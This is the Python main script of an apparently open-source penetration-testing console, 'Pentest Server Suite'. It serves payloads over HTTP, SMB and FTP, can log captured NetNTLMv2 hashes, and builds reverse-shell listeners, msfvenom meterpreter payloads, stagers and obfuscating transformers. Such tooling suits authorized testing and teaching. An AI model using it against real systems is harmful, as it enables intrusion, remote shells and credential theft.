import argparse
import logging as logger
import os
import re
import subprocess
from pathlib import Path

import colorama
import netifaces
from colorama import Fore
from prompt_toolkit import PromptSession
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import HTML
from prompt_toolkit.history import FileHistory
from prompt_toolkit.styles import Style

import pssutil.transformers
from pssmods.pssftp import PssFtpServer
from pssmods.psshttp import PssHttpServer
from pssmods.psssmb import PssSmbServer
from pssutil.cmdutils import cmd_copy_or_execute, cmd_print_unknown, cmd_split, cmd_validate, ensure_folder, generate_random_filename
from pssutil.coloredformatter import ColoredFormatter
from pssutil.nestedwordcompleter import NestedWordCompleter
from pssutil.payloadmanager import PayloadManager

VERSION = "0.1.2"


def build_config_path(config_dir: Path, name: str) -> Path:
    if not config_dir.exists():
        os.makedirs(config_dir)

    # path may start with a "/", this is intended,
    # beware of file overwriting
    config_path = Path(config_dir, name)

    if not config_path.parent.exists():
        os.makedirs(config_path)

    return config_path


def handle_filepath_cmd(s: str, args):
    _, sub_sub_args = cmd_split(args, True)
    filepath = Path(" ".join(sub_sub_args))
    print(s.replace("{FP}", str(filepath)).replace("{FPN}", str(filepath.name)))


def change_serve_folder(pm: PayloadManager, folder: Path, smb_server: PssSmbServer, ftp_server: PssFtpServer):
    if folder.exists():
        logger.info(f'Serving folder changed to "{Fore.LIGHTYELLOW_EX}{folder.absolute()}{Fore.RESET}"')

        # prevent the output of smb debug stuff
        prev_logging_level = logger.getLogger().level
        logger.getLogger().setLevel(logger.WARNING)

        # http serve folder is set via config
        pm.cfg.serve_folder = folder
        pm.update_serve_folder_watchdog()

        if pm.cfg.uploads_use_serve_folder:
            pm.cfg.uploads_folder = Path(pm.cfg.serve_folder, "uploads")

        if smb_server:
            smb_server.set_folder(folder)

        if ftp_server:
            ftp_server.set_folder(folder)

        logger.getLogger().setLevel(prev_logging_level)
    else:
        logger.warning(f'Folder "{Fore.LIGHTYELLOW_EX}{folder.absolute()}{Fore.RESET}" does not exist')


def print_help():
    print(
        f""">> {Fore.LIGHTYELLOW_EX}Basic{Fore.RESET}
   - exit                      : Shutdown server and exit.
   - save {{NAME}}               : Save current options and shell selection. No name to save as default.
   - load {{NAME}}               : Load saved options and shell selection. No name to load default.
   - set {{NAME}} {{VALUE}} (s)    : Set the options value.
   - serve {{VALUE}}      (x)    : Set the serving folder.
   - http (copy)               : Print/copy the http server address.
   - smb  (copy)               : Print/copy the smb server address.
   - ftp  (copy)               : Print/copy the ftp server address.
   - pty  (copy, execute, tmux): Generate/copy python pty shell upgrade command.
   - nc   (copy, execute, tmux): Generate/copy netcat listener command.
   - ncat (copy, execute, tmux): Generate/copy ncat listener command.
   - msfl (copy, execute, tmux): Generate/copy metasploit multi/handler listener command.
   - msfv {{PAYLOAD}} {{FORMAT}}   : Generate a msfvenom executable.

>> {Fore.LIGHTYELLOW_EX}Shells{Fore.RESET} (sh, shells)
   - list          (l): List all loaded shells.
   - select {{NAME}} (s): Select a shell payload.
   - options       (o): Show options for the selected shell.

>> {Fore.LIGHTYELLOW_EX}Launchers{Fore.RESET} (l, launchers)
   - generate {{LAUNCHER}} (copy): Generate/copy a launcher command.
   - list                (l)   : List all loaded launchers.

>> {Fore.LIGHTYELLOW_EX}Stagers{Fore.RESET} (st, stagers)
   - list         (l): List all loaded stagers.
   - print {{NAME}} (p): Print stager.
   - build {{NAME}} (b): Print stager with shell.

>> {Fore.LIGHTYELLOW_EX}Transformers{Fore.RESET} (t, transformers)
   - list           (l): List all loaded transformers.
   - disableall     (x): Disable all transformers.
   - enable {{NAME}}  (e): Enable a transformer.
   - disable {{NAME}} (d): Disable a transformer."""
    )


def setup_argparser():
    script_dir = Path(__file__).parent
    parser = argparse.ArgumentParser()
    parser.add_argument("-S", "--serve", dest="serve_folder", help="Serve folder for the servers", type=str, required=True)

    parser.add_argument("--http-host", default="0.0.0.0", dest="http_host", help="Listen address for the HTTP server", type=str)
    parser.add_argument("--http-port", default="80", dest="http_port", help="Listen port for the HTTP server", type=int)
    parser.add_argument("--no-http", default=False, dest="no_http", help="Disable HTTP server", action="store_true")
    parser.add_argument("--no-uploads", default=True, dest="accept_uploads", help="Disable HTTP file upload support", action="store_false")
    parser.add_argument("-U", "--upload-folder", default=None, dest="uploads_folder", help="Folder to store files uploaded via HTTP POST", type=str)

    parser.add_argument("--smb-host", default="0.0.0.0", dest="smb_host", help="Listen address for the SMB server", type=str)
    parser.add_argument("--smb-port", default="445", dest="smb_port", help="Listen port for the SMB server", type=int)
    parser.add_argument("--smb-john-file", default=None, dest="jtr_folder", help="Log NetNTLMv2 hashes to a file", type=str)
    parser.add_argument("--no-smb", default=False, dest="no_smb", help="Disable SMB server", action="store_true")
    parser.add_argument("--no-smb2", default=False, dest="no_smb2", help="Disable SMB2 support", action="store_true")

    parser.add_argument("--ftp-host", default="0.0.0.0", dest="ftp_host", help="Listen address for the FTP server", type=str)
    parser.add_argument("--ftp-port", default="21", dest="ftp_port", help="Listen port for the FTP server", type=int)
    parser.add_argument("--no-ftp", default=False, dest="no_ftp", help="Disable FTP server", action="store_true")

    parser.add_argument("--lhost", default="", dest="lhost", help="Default LHOST value", type=str)
    parser.add_argument("--lport", default="4711", dest="lport", help="Default LPORT value", type=str)
    parser.add_argument("--shellbin", default="/bin/bash", dest="shellbin", help="Default shell binary to use", type=str)

    parser.add_argument("--shells-file", default=str(Path(script_dir, "shells.json")), dest="shells_file", help="JSON file containing shells", type=str)
    parser.add_argument("--launchers-file", default=str(Path(script_dir, "launchers.json")), dest="launchers_file", help="JSON file containing launchers", type=str)
    parser.add_argument("--stagers-folder", default=str(Path(script_dir, "stagers")), dest="stagers_folder", help="Folder containing stager files", type=str)
    parser.add_argument("--no-history", default=False, dest="no_history", help='Disable history saving in file "~/.psshistory"', action="store_true")
    return parser.parse_args()


def execute_os_cmd(args, cmd):
    try:
        os_cmd = "".join(cmd[1:]) + " " + " ".join(args)

        try:
            if len(os_cmd) == 0:
                os_cmd = os.environ.get("SHELL", "/bin/bash")

            os.system(os_cmd)
        except Exception as ex:
            logger.warning(f'Failed to execute: "{Fore.LIGHTRED_EX}{os_cmd}{Fore.RESET}": {ex}')
    except Exception as ex:
        logger.warning(f"Failed parse command: {ex}")


if __name__ == "__main__":
    colorama.init()
    ColoredFormatter.init()

    args = setup_argparser()

    print(f">> {Fore.LIGHTYELLOW_EX}Pentest Server Suite{Fore.RESET} v{VERSION}")
    print(f"   [{Fore.LIGHTBLACK_EX}#{Fore.RESET}] https://github.com/Jnnshschl/PentestServerSuite\n")
    print(f'   [{Fore.LIGHTYELLOW_EX}?{Fore.RESET}] Type "help" or "?" to see all available commands.')
    print(f"   [{Fore.LIGHTRED_EX}!{Fore.RESET}] This is software introduces vulnerabilities to your system while running.\n")

    pm = PayloadManager()
    network_interfaces = netifaces.interfaces()

    # load all shells
    if Path(args.shells_file).exists():
        with open(args.shells_file) as shells_file:
            pm.load_shells(shells_file.read())
    else:
        logger.error(f'Shells file missing: "{args.shells_file}"')

    # load all stagers
    if Path(args.stagers_folder).exists():
        pm.load_stagers(args.stagers_folder)
    else:
        logger.error(f'Stagers folder missing: "{args.stagers_folder}"')

    # load all launchers
    if Path(args.launchers_file).exists():
        with open(args.launchers_file) as launchers_file:
            pm.load_launchers(launchers_file.read())
    else:
        logger.error(f'Launchers file missing: "{args.launchers_file}"')

    # load all tranformers from the transformers.py file
    transformers_set = set()

    for name, transformer in pssutil.transformers.get_all():
        pm.transformer_register(transformer)
        transformers_set.add(name)

    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.launcher_count}{Fore.RESET} Launchers")
    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.stager_count}{Fore.RESET} Stagers")
    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.shell_count}{Fore.RESET} Shells")
    logger.info(f"Loaded {Fore.LIGHTYELLOW_EX}{pm.transformer_count}{Fore.RESET} Tranformers")

    # cvar proxy to resolve a network interface to its ip address
    pm.cvars.add_proxy("LHOST", lambda v: netifaces.ifaddresses(v)[netifaces.AF_INET][0]["addr"])

    # set initial cvar values
    if args.lhost and len(args.lhost) > 0:
        pm.cvars.LHOST = args.lhost
    else:
        # try to select a default nic as LHOST
        pm.cvars.LHOST = next(filter(lambda v: v in network_interfaces, ["tun0", "eth0"]), None)

    pm.cvars.LPORT = args.lport if args.lport else 4711
    pm.cvars.SHELLBIN = args.shellbin if args.shellbin else "/bin/bash"

    # start servers in background
    serve_folder = Path(args.serve_folder)

    if not ensure_folder(serve_folder):
        logger.warning(f'Failed to create serve folder: "{Fore.LIGHTRED_EX}{serve_folder}{Fore.RESET}"')
        exit(1)

    http_server = PssHttpServer(args.http_host, int(args.http_port), serve_folder) if not args.no_http else None
    ftp_server = PssFtpServer(args.ftp_host, int(args.ftp_port), serve_folder) if not args.no_ftp else None
    smb_server = PssSmbServer(args.smb_host, int(args.smb_port), serve_folder) if not args.no_smb else None

    if args.jtr_folder:
        jtr_folder = Path(args.jtr_folder)

        if jtr_folder.parent.exists():
            smb_server.set_jtr_logfolder(jtr_folder)
        else:
            logger.warning(f'John output path invalid: "{Fore.LIGHTRED_EX}{jtr_folder}{Fore.RESET}"')

    # change serving folder if supplied
    if args.serve_folder:
        change_serve_folder(pm, serve_folder, smb_server, ftp_server)

    # set uploads folder to supplied value, otherwise place stuff in the serve folder
    pm.cfg.accept_uploads = args.accept_uploads

    if pm.cfg.accept_uploads:
        if args.uploads_folder:
            pm.cfg.uploads_folder = Path(args.uploads_folder)
        else:
            pm.cfg.uploads_folder = Path(pm.cfg.serve_folder, "uploads")
            pm.cfg.uploads_use_serve_folder = True

        if not ensure_folder(serve_folder):
            logger.warning(f'Failed to create uploads folder: "{Fore.LIGHTRED_EX}{pm.cfg.uploads_folder}{Fore.RESET}"')
            exit(1)

    # setup prompt
    serve_files_completer = WordCompleter(
        lambda: pm.serve_files,
        ignore_case=True,
        match_middle=True,
        pattern=re.compile(r"([a-zA-Z0-9_\.\-]+|[^a-zA-Z0-9_\.\-\s]+)"),
    )

    shells_dict = {
        "l": None,
        "list": None,
        "set": pm.shell_names,
        "select": pm.shell_names,
        "build": pm.shell_names,
        "options": None,
    }

    launchers_dict = {
        "l": None,
        "list": None,
        "g": {x: serve_files_completer for x in pm.launcher_names},
        "generate": {x: serve_files_completer for x in pm.launcher_names},
    }

    stagers_dict = {
        "l": None,
        "list": None,
        "print": pm.cfg.stagers,
        "build": pm.cfg.stagers,
    }

    transformers_dict = {
        "l": None,
        "list": None,
        "disableall": None,
        "enable": transformers_set,
        "disable": transformers_set,
    }

    copy_dict = ["copy", "execute", "tmux"]
    ports_dict = ["25", "80", "443", "1299", "1337", "4444", "4711"]

    msfv_encoders = ["x86/shikata_ga_nai"]
    msfv_tlinux_dict = ["elf", "asp", "war"]
    msfv_twindows_dict = ["exe", "msi", "dll", "vba", "asp", "aspx", "war"]

    msfv_payload_dict = {
        "linux/x86/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/shell_reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter/reverse_tcp": msfv_tlinux_dict,
        "linux/x86/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "linux/x64/meterpreter_reverse_tcp": msfv_tlinux_dict,
        "windows/shell/reverse_tcp": msfv_twindows_dict,
        "windows/shell_reverse_tcp": msfv_twindows_dict,
        "windows/x64/shell_reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter/reverse_tcp": msfv_twindows_dict,
        "windows/meterpreter_reverse_tcp": msfv_twindows_dict,
        "windows/x64/meterpreter_reverse_tcp": msfv_twindows_dict,
        "java/jsp_shell_reverse_tcp": "raw",
        "php/reverse_php": "raw",
    }

    def print_toolbar():
        bottom_str = f'SHELL: <style bg="ansiyellow">{pm.cvars.SHELL}</style>'
        bottom_str += f' | SHELLBIN: <style bg="ansiyellow">{pm.cvars.SHELLBIN}</style>'
        bottom_str += f' | LHOST: <style bg="ansiyellow">{pm.cvars.LHOST}</style>'
        bottom_str += f' | LPORT: <style bg="ansiyellow">{pm.cvars.LPORT}</style>'
        bottom_str += f' | Serving: "<style bg="ansiyellow">{pm.cfg.serve_folder.absolute()}</style>"'
        return HTML(bottom_str)

    prompt_completer = NestedWordCompleter.from_nested_dict(
        {
            "exit": None,
            "save": None,
            "load": None,
            "set": {
                "LHOST": network_interfaces,
                "LPORT": ports_dict,
            },
            "serve": None,
            "http": copy_dict,
            "smb": {
                "copy": None,
                "john": ["on", "off"],
            },
            "nc": copy_dict,
            "ncat": copy_dict,
            "socat": copy_dict,
            "msfl": copy_dict,
            "msfv": msfv_payload_dict,
            "pty": copy_dict,
            "sh": shells_dict,
            "shell": shells_dict,
            "shells": shells_dict,
            "l": launchers_dict,
            "launcher": launchers_dict,
            "launchers": launchers_dict,
            "st": stagers_dict,
            "stager": stagers_dict,
            "stagers": stagers_dict,
            "t": transformers_dict,
            "transformer": transformers_dict,
            "transformers": transformers_dict,
        }
    )

    cli_session = PromptSession(
        history=None if args.no_history else FileHistory(Path(os.path.expanduser("~"), ".psshistory")),
        auto_suggest=AutoSuggestFromHistory(),
        bottom_toolbar=print_toolbar,
        style=Style.from_dict({"pss": "ansibrightyellow", "bottom-toolbar": "#303030 bg:#dddddd"}),
        completer=prompt_completer,
        complete_in_thread=True,
        complete_while_typing=True,
        message=[("class:pss", "pss"), ("", "> ")],
    )

    config_dir = Path(Path(__file__).parent, "configs")

    while 1:
        input_arr = list(filter(None, cli_session.prompt().strip().split(" ")))
        cmd, args = cmd_split(input_arr, True)

        if cmd.startswith("!"):
            execute_os_cmd(args, cmd)

        elif cmd in ["?", "help"]:
            print_help()

        elif cmd == "exit":
            break

        elif cmd == "save":
            pm.save_config(build_config_path(config_dir, args[0] if len(args) > 0 else "default"))

        elif cmd == "load":
            pm.load_config(build_config_path(config_dir, args[0] if len(args) > 0 else "default"))

        elif cmd in ["s", "set"]:
            if cmd_validate(input_arr, 2, 'Missing arguments: "cvar name", "value"'):
                if cmd_validate(input_arr, 3, 'Missing arguments: "value"'):
                    pm.cvars[input_arr[1]] = " ".join(input_arr[2:])

        elif cmd in ["x", "serve"]:
            if cmd_validate(input_arr, 2, 'Missing arguments: "folder"'):
                change_serve_folder(pm, Path(" ".join(input_arr[1:])), smb_server, ftp_server)

        elif cmd == "http":
            cmd_copy_or_execute(args, f"http://{pm.cvars.LHOST}/")

        elif cmd == "ftp":
            cmd_copy_or_execute(args, f"anonymous@{pm.cvars.LHOST}")

        elif cmd == "nc":
            cmd_copy_or_execute(args, f"nc -lvnp {pm.cvars.LPORT}")

        elif cmd == "ncat":
            cmd_copy_or_execute(args, f"ncat -lvnp {pm.cvars.LPORT}")

        elif cmd == "socat":
            cmd_copy_or_execute(args, f"socat file:`tty`,raw,echo=0 tcp-listen:{pm.cvars.LPORT}")

        elif cmd == "msfl":
            cmd_copy_or_execute(args, f'msfconsole -q -x "use multi/handler; set LHOST {pm.cvars.LHOST}; set LPORT {pm.cvars.LPORT}; run"')

        elif cmd == "msfv":
            if cmd_validate(input_arr, 2, 'Missing arguments: "payload", "type"'):
                if cmd_validate(input_arr, 3, 'Missing arguments: "type"'):
                    msfv_payload, sub_args = cmd_split(args)
                    msfv_type, sub_args = cmd_split(sub_args)

                    msfv_tmpfolder = Path(pm.cfg.serve_folder, "tmp")
                    msfv_tmpfile = generate_random_filename(msfv_tmpfolder, msfv_type) if len(sub_args) == 0 else sub_args[0]

                    if not msfv_tmpfolder.exists():
                        os.makedirs(msfv_tmpfolder)

                    msfv_cmd = f"msfvenom -p {msfv_payload} LHOST={pm.cvars.LHOST} LPORT={pm.cvars.LPORT} -f {msfv_type} -o {msfv_tmpfile}"
                    subprocess.call(msfv_cmd.split(" "), stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
                    logger.info(f'Generated: "{Fore.LIGHTYELLOW_EX}{msfv_tmpfile}{Fore.RESET}"\n{Fore.LIGHTBLACK_EX}{msfv_cmd}{Fore.RESET}')

        elif cmd == "pty":
            cmd_copy_or_execute(args, f"python -c 'import pty; pty.spawn(\"{pm.cvars.SHELLBIN}\")'")

        elif cmd == "smb":
            if cmd_validate(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = cmd_split(args, True)

                if sub_cmd in ["jtr", "john"]:
                    if cmd_validate(input_arr, 3, 'Missing arguments: "on, off or FOLDER"'):
                        sub_sub_cmd, sub_sub_args = cmd_split(sub_args, True)

                        if sub_sub_cmd in ["on"]:
                            jtr_path = Path(pm.cfg.serve_folder, "smb-hashes.txt")
                            smb_server.set_jtr_logfolder(jtr_path)
                            logger.info(f'SMB hash output set to: "{Fore.LIGHTYELLOW_EX}{jtr_path}{Fore.RESET}"')
                        elif sub_sub_cmd in ["off"]:
                            smb_server.set_jtr_logfolder(None)
                            logger.info(f'SMB hash output "{Fore.LIGHTRED_EX}disabled{Fore.RESET}"')
                        else:
                            jtr_path = Path(sub_sub_cmd)

                            if jtr_path.exists():
                                smb_server.set_jtr_logfolder(sub_sub_cmd)
                                logger.info(f'SMB hash output set to: "{Fore.LIGHTYELLOW_EX}{jtr_path}{Fore.RESET}"')
                            else:
                                logger.warning(f'Path does not exist: "{Fore.LIGHTRED_EX}{jtr_path}{Fore.RESET}"')

                else:
                    cmd_copy_or_execute(args, f"\\\\{pm.cvars.LHOST}\\{smb_server.default_share}\\")

        elif cmd in ["l", "launcher", "launchers"]:
            # LAUNCHER sub-commands
            if cmd_validate(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = cmd_split(args, True)

                if sub_cmd in ["l", "list"]:
                    for launcher in pm.cfg.launchers:
                        print(launcher)

                elif sub_cmd in ["g", "generate"]:
                    if cmd_validate(input_arr, 3, 'Missing arguments: "launcher"'):
                        launcher, sub_sub_args = cmd_split(sub_args, True)
                        print(pm.launcher_generate(launcher, " ".join(sub_sub_args), smb_server.default_share))

                else:
                    cmd_print_unknown(sub_cmd)

        elif cmd in ["sh", "shell", "shells"]:
            # SHELL sub-commands
            if cmd_validate(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = cmd_split(args, True)

                if sub_cmd in ["l", "list"]:
                    for shell in pm.cfg.shells:
                        print(shell)

                elif sub_cmd in ["s", "set", "select"]:
                    shell = sub_args[0].lower()

                    if pm.shell_try_get(shell):
                        pm.cvars.SHELL = shell
                    else:
                        logger.warning(f'No shell found with name "{Fore.LIGHTRED_EX}{shell}{Fore.RESET}". If you want to directly inject something, set the SHELL option manually using "set SHELL ..."')

                elif sub_cmd in ["b", "build"]:
                    shell_name = sub_args[0].lower()
                    shell = pm.shell_try_get(shell_name)

                    if shell:
                        print(shell.fill(pm.cvars))
                    else:
                        logger.warning(f'No shell found with name "{Fore.LIGHTRED_EX}{shell_name}{Fore.RESET}". If you want to directly inject something, set the SHELL option manually using "set SHELL ..."')

                elif sub_cmd in ["o", "options"]:
                    shell = pm.cvars.SHELL
                    logger.info(f'Selected shell "{Fore.LIGHTYELLOW_EX}{shell}{Fore.RESET}"')

                    if shell:
                        for cvar in pm.get_cvars_shell(shell):
                            val = pm.cvars[cvar]

                            if val:
                                logger.info(f'{cvar} = "{Fore.LIGHTYELLOW_EX}{val}{Fore.RESET}"')
                            else:
                                logger.info(f"{cvar} = {Fore.LIGHTRED_EX}Not set{Fore.RESET}")

                else:
                    cmd_print_unknown(sub_cmd)

        elif cmd in ["st", "stager", "stagers"]:
            # STAGER sub-commands
            if cmd_validate(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = cmd_split(args, True)

                if sub_cmd in ["l", "list"]:
                    for stager in pm.cfg.stagers:
                        print(stager)

                elif sub_cmd in ["p", "print"]:
                    print(pm.stager_get_content(sub_args[0].lower()))

                elif sub_cmd in ["b", "build"]:
                    print(pm.build_payload(sub_args[0].lower()))

                else:
                    cmd_print_unknown(sub_cmd)

        elif cmd in ["t", "transformer", "transformers"]:
            # TRANFORMER sub-commands
            if cmd_validate(input_arr, 2, 'Missing arguments: "sub-command"'):
                sub_cmd, sub_args = cmd_split(args, True)

                if sub_cmd in ["l", "list"]:
                    for transformer in pm.cfg.transformers.keys():
                        is_enabled = pm.cfg.transformers[transformer]["enabled"]
                        color = Fore.LIGHTGREEN_EX if is_enabled else Fore.LIGHTRED_EX
                        print(f"[{color}{'X' if is_enabled else '-'}{Fore.RESET}] {transformer}")

                elif sub_cmd in ["x", "disableall"]:
                    for transformer in pm.cfg.transformers.keys():
                        is_enabled = pm.cfg.transformers[transformer]["enabled"]

                        if is_enabled:
                            pm.cfg.transformers[transformer]["enabled"] = False
                            logger.info(f"{transformer} {Fore.LIGHTRED_EX}disabled{Fore.RESET}")

                elif sub_cmd in ["e", "+", "enable"]:
                    pm.tranformer_switch(sub_args[0], True)

                elif sub_cmd in ["d", "-", "disable"]:
                    pm.tranformer_switch(sub_args[0], False)

                elif args[0] in pm.cfg.transformers:
                    pm.tranformer_switch(args[0])

                else:
                    cmd_print_unknown(sub_cmd)

        else:
            cmd_print_unknown(cmd)

    colorama.deinit()
